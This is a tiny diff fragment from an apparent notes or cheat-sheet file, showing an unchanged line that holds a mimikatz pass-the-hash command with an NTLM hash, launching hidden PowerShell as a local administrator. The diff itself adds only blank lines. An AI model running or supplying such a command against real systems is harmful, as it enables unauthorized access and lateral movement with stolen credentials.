@@ -18,3 +18,5 @@ updated_at: '2023-05-29T16:48:52.884824+00:00'
 mimikatz sekurlsa::pth /user:localadmin /domain:. /ntlm:21306681c738c3ed2d615e29be1574a3 /run:powershell -w hidden
 
 ```
+
+
